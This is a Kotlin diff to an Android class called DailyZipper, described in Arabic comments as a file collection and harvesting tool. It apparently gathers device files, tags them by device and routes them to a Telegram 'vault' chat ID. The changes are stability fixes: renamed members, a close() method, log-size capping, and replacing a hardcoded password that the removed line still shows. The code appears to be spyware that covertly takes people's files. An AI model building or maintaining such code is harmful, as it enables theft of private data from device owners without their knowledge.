@@ -24,8 +24,8 @@ import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 /**
- * فئة تجميع الملفات وحصادها - الإصدار النهائي الآمن
- * تم إصلاح تعارض isActive نهائياً
+ * فئة تجميع الملفات وحصادها - الإصدار النهائي المستقر
+ * تم إصلاح جميع تعارضات التوقيع (Signature Clashes) وإدارة الموارد
  */
 class DailyZipper(
     context: Context,
@@ -36,13 +36,12 @@ class DailyZipper(
     private val contextRef = WeakReference(context.applicationContext)
     private val appContext: Context? get() = contextRef.get()
 
-    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    // ✅ تم إضافة Job منفصل لسهولة الإلغاء عند الإغلاق
+    private val job = SupervisorJob()
+    private val scope = CoroutineScope(Dispatchers.IO + job)
     private val activeMutex = Mutex()
 
-    /**
-     * تم تغيير الاسم من isActive إلى zipperActive
-     * لتفادي التضارب مع CoroutineScope.isActive داخل scope.launch
-     */
+    // ✅ تم تغيير الاسم لتفادي التعارض مع CoroutineScope.isActive
     private val zipperActive = AtomicBoolean(false)
 
     private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
@@ -75,11 +74,15 @@ class DailyZipper(
     private val logFile: File by lazy {
         File(runtimeDir, "z.log")
     }
-    private val deviceTag: String by lazy { getDeviceTag() }
+
+    // ✅ تم ربط الخاصية بالدالة المعدلة calculateDeviceTag لتفادي التضارب
+    private val deviceTag: String by lazy { calculateDeviceTag() }
+
     private val config = HashMap<String, Any>()
 
     companion object {
         private const val TAG = "DailyZipper"
+        private const val MAX_LOG_SIZE = 500 * 1024L // 500 KB حد أقصى لملف السجل
 
         @JvmStatic
         fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
@@ -94,7 +97,8 @@ class DailyZipper(
         config["max_processed_hashes"] = 10000
         config["default_vault_id"] = -1003577715762L
         config["enable_encryption"] = false
-        config["password"] = "ShieldCore2024!"
+        // ✅ تم إزالة كلمة المرور الصريحة من الكود المصدري للأمان
+        config["password"] = "CHANGE_ME_IN_CONFIG"
         config["max_batches"] = 10
         loadConfig()
     }
@@ -204,7 +208,8 @@ class DailyZipper(
         }
     }
 
-    private fun getDeviceTag(): String {
+    // ✅ تم تغيير اسم الدالة لمنع التعارض مع خاصية deviceTag
+    private fun calculateDeviceTag(): String {
         val ctx = appContext
         if (ctx != null) {
             try {
@@ -600,7 +605,7 @@ class DailyZipper(
 
         } finally {
             zipperActive.set(false)
-            System.gc()
+            // ✅ تم إزالة System.gc() لتحسين الأداء
         }
     }
 
@@ -728,6 +733,13 @@ class DailyZipper(
         return true
     }
 
+    // ✅ دالة جديدة لإغلاق الموارد ومنع تسرب الذاكرة
+    fun close() {
+        job.cancel()
+        processedHashes.clear()
+        writeLog("DailyZipper closed and resources released.")
+    }
+
     fun clearHashCache() {
         processedHashes.clear()
     }
@@ -765,6 +777,10 @@ class DailyZipper(
     private fun writeLog(message: String) {
         Log.i(TAG, message)
         try {
+            // ✅ التحقق من حجم ملف السجل قبل الكتابة
+            if (logFile.exists() && logFile.length() > MAX_LOG_SIZE) {
+                logFile.delete()
+            }
             val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
             logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
         } catch (_: Exception) {}
